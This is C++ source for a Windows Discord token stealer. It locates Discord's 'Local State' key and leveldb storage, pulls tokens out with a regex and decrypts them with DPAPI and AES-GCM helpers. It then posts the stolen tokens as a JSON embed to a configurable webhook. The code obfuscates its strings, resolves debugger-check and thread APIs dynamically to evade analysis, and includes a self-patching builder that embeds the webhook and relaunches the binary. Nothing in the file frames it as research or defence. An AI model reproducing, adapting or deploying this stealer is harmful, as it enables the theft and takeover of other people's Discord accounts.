#include <iostream>

#include <skcrypt/skcrypt.hpp>

#include <shlobj_core.h>
#include <filesystem>
#include <fstream>

#include <vector>
#include <regex>

#include "request.h"
#include "crypter.h"
#include "patcher.h"

#include "resource.h"

#define WEBHOOK_URL skCrypt("EXAMPLE_HOOK")

std::vector<std::string> tokens = {};

void Thread(void* data);

typedef HANDLE(WINAPI* CreateThreadCustom)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* IsDebPresent)();

/*
* TODO:
* [] Add skcrypt to every string
* [] Maybe put
*/

int main(int argc, char** argv) {
	IsDebPresent isDebPresent = (IsDebPresent)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("IsDebuggerPresent"));
	if (isDebPresent()) {
		std::cout << "Hello, World" << std::endl;
		//return 0;
	}

	CreateThreadCustom createThreadCustom = (CreateThreadCustom)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("CreateThread"));

	for (int i = 0; i < argc; i++) {
		if (i == 0) {
			Sleep(500);
			std::string executable(argv[i]);

			executable = executable.substr(executable.find_last_of("\\") + 1);
			if (executable.starts_with("patched_")) {
				if(std::filesystem::exists("avec.exe")) 
					std::filesystem::remove("avec.exe");

				Sleep(500);
				std::filesystem::rename(executable, "avec.exe");
				return 0;
			}
		}

		if (i == 1) {
			std::string executable(argv[0]);
			executable = executable.substr(0, executable.find_last_of("\\") + 1);
			executable.append(skCrypt("patched_avec.exe"));


			if (std::filesystem::exists(executable)) {
				std::filesystem::remove(executable);
				Sleep(1000);
			}

			std::filesystem::copy_file(argv[0], executable);

			Sleep(3000);
			std::string text;
			std::ifstream webhookFile(argv[i]);
			
			std::getline(webhookFile, text);
			std::cout << text << std::endl;
			
			Patcher* p = new Patcher(executable);
			if (!p->Patch(text)) {
				std::cout << "Couldn't patch this executable. Please try again. (0x" << std::hex << GetLastError() << ")" << std::dec << std::endl;
				Sleep(5000);
				return 1;
			}

			delete p;

			STARTUPINFOA info = {};
			ZeroMemory(&info, sizeof info);

			info.cb = sizeof(info);

			PROCESS_INFORMATION pInfo = {};
			ZeroMemory(&pInfo, sizeof pInfo);

			CreateProcessA(nullptr, (LPSTR) executable.c_str(), nullptr, nullptr, FALSE, DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP, nullptr, nullptr, &info, &pInfo);
			return 0;
		}
	}
	printf("started\n");

	PWSTR szAppdata;
	SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &szAppdata);
	CoTaskMemFree(szAppdata);

	std::wstring szKeyFile(szAppdata);
	szKeyFile.append(skCrypt(L"/Discord/Local State"));

	std::wstring szDatabaseDir(szAppdata);
	szDatabaseDir.append(skCrypt(L"/Discord/Local Storage/leveldb/"));

	if (!std::filesystem::exists(szKeyFile)) {
		std::cout << skCrypt("Couldn't find Local State in discord directory") << std::endl;
		return 0;
	}

	std::ifstream localState(szKeyFile);
	std::string keyFile;

	std::string text;
	while (std::getline(localState, text)) {
		keyFile.append(text);
	}

	localState.close();


	keyFile = keyFile.substr(keyFile.find(skCrypt("encrypted_key")) + 16);
	keyFile = keyFile.substr(0, keyFile.find("\""));

	std::vector<HANDLE> threads = {};
	for (const auto& entry : std::filesystem::directory_iterator(szDatabaseDir)) {
		if (entry.is_regular_file()) {
			std::filesystem::path file = entry.path();

			if (!file.extension().filename().string().compare(skCrypt(".ldb"))) {
				std::string s = file.string();

				HANDLE hThread = createThreadCustom(nullptr, 0, (LPTHREAD_START_ROUTINE)Thread, static_cast<void*>(&s), 0, nullptr);
				threads.push_back(hThread);
				Sleep(25);
			}
		}

	}
	std::cout << 5 << std::endl;

	for (auto& thread : threads) {
		WaitForSingleObject(thread, INFINITE);
	}
	threads.clear();

	std::string body(skCrypt(R"({
	  "content": "@here",
	  "embeds": [
		{
		  "title": "Tokens fetched:",
		  "color": null,
		  "fields": [
	)"));

	int i = 0;
	for (auto& str : tokens) {
		str = str.substr(12); // The encrypted token after "dQw4w9WgXcQ:"

		std::vector<BYTE> encryptedKey = base64::Decode(keyFile);
		std::vector<BYTE> test = { encryptedKey.begin() + 5, encryptedKey.end() };
		std::vector<BYTE> decryptedKey = crypter::Unprotect(test);

		std::vector<BYTE> token = base64::Decode(str);
		std::vector<BYTE> nonsense(token.begin() + 3, token.begin() + 15);
		std::vector<BYTE> text(token.begin() + 15, token.end() - 16);
		std::vector<BYTE> tag(token.end() - 16, token.end());

		std::string decrypted = crypter::Decrypt(decryptedKey, nonsense, text, tag);
		//std::cout << "Decrypted Token: " << decrypted << std::endl;

		body.append(skCrypt(R"({"name":"token:", "value":")"));
		body.append(decrypted);
		body.append(R"("})");
		
		if (i != tokens.size() - 1) {
			body.append(",");
		}
		i++;
	}

	body.append(R"(]
		}
	  ],
	  "attachments": []
	})");

	std::cout << body << std::endl;

	std::string webhook = WEBHOOK_URL.decrypt();

	if (!webhook.compare("EXAMPLE_HOOK")) { // NOT SET BY COMPILER
		webhook = resources::ReadResource();
	}

	std::map<std::string, std::string> headers = {
		{skCrypt("Content-Type").decrypt(), skCrypt("application/json").decrypt()},
		{skCrypt("User-Agent").decrypt(), skCrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0").decrypt()},
	};

	Request* req = new Request(webhook, headers, body);
	req->Post();

	return 0;
}



void Thread(void* data) {
	std::string& s = *(static_cast<std::string*>(data));

	std::ifstream file(s, std::ios::binary);
	if (!file) {
		std::cerr << "Failed to open file: " << s << std::endl;
		return;
	}

	std::ostringstream buffer;
	buffer << file.rdbuf();
	std::string keyFile = buffer.str();

	std::regex pattern(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\""]*)");
	std::smatch match;

	if (std::regex_search(keyFile, match, pattern)) {
		for (auto& m : match) {
			tokens.push_back(m);
		}
	}
}
